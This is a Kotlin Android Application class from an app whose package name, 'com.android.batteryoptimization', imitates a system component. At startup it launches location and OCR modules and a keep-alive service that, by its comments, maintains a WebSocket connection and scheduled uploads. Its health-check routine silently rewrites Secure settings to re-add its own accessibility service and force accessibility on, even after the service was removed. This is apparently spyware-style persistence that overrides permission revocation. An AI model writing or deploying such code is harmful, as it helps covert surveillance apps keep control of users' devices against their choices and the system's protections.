package com.android.batteryoptimization

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Process
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import com.android.batteryoptimization.ocr.api.OcrContextHolder
import com.didi.drouter.api.DRouter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class App : Application() {

    companion object {
        const val PREFS_HEALTH = "accessibility_health"
        const val KEY_NEED_MANUAL_SETUP = "need_manual_setup_vivo"
        const val KEY_MANUAL_SETUP_NOTICE_TIME = "manual_setup_notice_ts"
    }

    private val appScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        setupGlobalExceptionHandler()
        // 高德隐私合规必须先于任何高德 SDK 接口（含 setApiKey）调用，否则 key 设置不生效（errorCode 10001）
        AMapLocationHelper.initPrivacy(this)
        // 注入 Application Context，供 :ocr_module 中经 DRouter 寻址到的服务使用
        OcrContextHolder.init(this)
        // 初始化 DRouter（必须在通过 DRouter.build().getService() 之前调用）
        DRouter.init(this)
        // 从缓存恢复高德 SDK Key，避免等待 WebSocket 下发 amap_config
        AMapLocationHelper.initFromCache(this)
        // 启动保活服务：尽早恢复 WebSocket 连接与定时上传，不依赖无障碍服务绑定时机
        try {
            startService(Intent(this, KeepAliveService::class.java))
        } catch (_: Exception) {
        }
        // 启动无障碍服务故障自愈探测
        scheduleAccessibilityHealthCheck()
    }

    /**
     * 全局未捕获异常兜底：防止崩溃后系统直接把无障碍服务标记为"故障"。
     * 这里选择自杀而不是让系统杀掉，确保下次重启时服务有机会重新绑定。
     */
    private fun setupGlobalExceptionHandler() {
        val defaultHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e("App", "Uncaught exception on thread=${thread.name}, kill process softly", throwable)
            try {
                defaultHandler?.uncaughtException(thread, throwable)
            } catch (_: Throwable) {
            }
            try {
                Process.killProcess(Process.myPid())
            } catch (_: Throwable) {
            }
        }
    }

    /**
     * 探测无障碍服务"故障"状态并自愈：
     * 系统设置里无障碍开关已开启，但 InputAccessibilityService.instance 为 null，
     * 说明进程被杀/崩溃后系统没有重新调用 onServiceConnected（即「此服务出现故障」）。
     * 此时通过 Settings 重新写入 ENABLED_ACCESSIBILITY_SERVICES 触发系统重新绑定。
     */
    private fun scheduleAccessibilityHealthCheck() {
        appScope.launch {
            // App 刚启动时先给系统一点时间完成服务绑定（3s）
            delay(3000L)
            val maxRetries = 4
            repeat(maxRetries) { idx ->
                val healDone = tryHealAccessibilityIfStuck(this@App)
                Log.d("App", "Accessibility health check #${idx + 1}: healDone=$healDone")
                if (healDone) return@launch
                // 每 6 秒重试一次，最多探测 ~24s
                delay(6000L)
            }
        }
    }

    private fun tryHealAccessibilityIfStuck(context: Context): Boolean {
        // 1. 实例已就绪，正常
        if (InputAccessibilityService.instance != null) {
            // 服务已正常绑定，清除可能残留的"需要手动设置"误报标记
            try {
                context.getSharedPreferences(PREFS_HEALTH, Context.MODE_PRIVATE)
                    .edit().putBoolean(KEY_NEED_MANUAL_SETUP, false).apply()
            } catch (_: Throwable) {
            }
            return true
        }
        // 2. 服务未连上。两种情况都尝试写 Settings 触发系统重新绑定：
        //    a) 故障状态：服务在列表里但 instance==null（进程被杀后未重绑）
        //    b) 被回收状态：服务已被 ROM 移除（OPPO/vivo/小米 覆盖安装或清后台后常见）
        Log.w("App", "Accessibility service not connected → try heal by writing Secure settings")
        val serviceName = "${context.packageName}/${InputAccessibilityService::class.java.canonicalName}"
        try {
            val resolver = context.contentResolver
            val current = Settings.Secure.getString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            val rewritten = if (current.contains(serviceName, ignoreCase = true)) {
                // 服务在列表里（故障状态）：先移除再加回，强制系统重新解析并绑定
                val remaining = current.split(':')
                    .filterNot { it.equals(serviceName, ignoreCase = true) }
                    .joinToString(":")
                if (remaining.isEmpty()) serviceName else "$remaining:$serviceName"
            } else {
                // 服务不在列表里（被 ROM 回收）：直接加回
                Log.w("App", "Service was removed by ROM, adding back. current=$current")
                if (current.isBlank()) serviceName else "$current:$serviceName"
            }
            Settings.Secure.putString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, rewritten)
            // 关键修复：OPPO/vivo 等 ROM 覆盖安装后会把全局开关 ACCESSIBILITY_ENABLED 重置为 0，
            // 即使服务名仍在 ENABLED_ACCESSIBILITY_SERVICES 列表里，系统也不会真正绑定服务。
            // 必须同时把全局开关置 1，onServiceConnected 才会被调用。
            Settings.Secure.putInt(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
            Log.d("App", "Rewrote ENABLED_ACCESSIBILITY_SERVICES + set ACCESSIBILITY_ENABLED=1, expect rebind shortly")
        } catch (e: SecurityException) {
            // 部分 ROM 不允许三方应用写 Settings.Secure（无 WRITE_SECURE_SETTINGS 权限）
            // vivo 机型这种情况很常见——记一个标记，下次用户打开 MainActivity 时弹窗引导
            val brand = BrandUtil.currentBrand()
            Log.e("App", "Cannot write Secure settings (brand=$brand), fallback to start KeepAliveService", e)
            // 仅当服务确实不在系统设置列表里（被 ROM 回收）时，才提示用户手动开启；
            // 若服务仍在列表中（只是尚未完成 onServiceConnected 绑定），不误报"权限被回收"
            val reallyRevoked = !isAccessibilityEnabledInSettings(context)
            if (reallyRevoked) {
                try {
                    val prefs = context.getSharedPreferences(PREFS_HEALTH, Context.MODE_PRIVATE)
                    prefs.edit()
                        .putBoolean(KEY_NEED_MANUAL_SETUP, true)
                        .putLong(KEY_MANUAL_SETUP_NOTICE_TIME, System.currentTimeMillis())
                        .apply()
                } catch (_: Throwable) {
                }
            } else {
                Log.d("App", "Service still in settings list, skip manual setup prompt (just not bound yet)")
            }
            try {
                context.startService(Intent(context, KeepAliveService::class.java))
            } catch (_: Exception) {
            }
        } catch (e: Exception) {
            Log.e("App", "Accessibility heal failed", e)
        }
        return false
    }

    /**
     * 检查无障碍是否已开启本服务。
     * vivo / iQOO ROM 会把服务写入 ENABLED_ACCESSIBILITY_SERVICES 但不置 ACCESSIBILITY_ENABLED=1，
     * 因此只看 ENABLED_ACCESSIBILITY_SERVICES 列表是否包含本服务即可。
     */
    private fun isAccessibilityEnabledInSettings(context: Context): Boolean {
        val service = "${context.packageName}/${InputAccessibilityService::class.java.canonicalName}"
        val settingValue = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (settingValue != null) {
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(settingValue)
            while (splitter.hasNext()) {
                if (splitter.next().equals(service, ignoreCase = true)) return true
            }
        }
        return false
    }
}
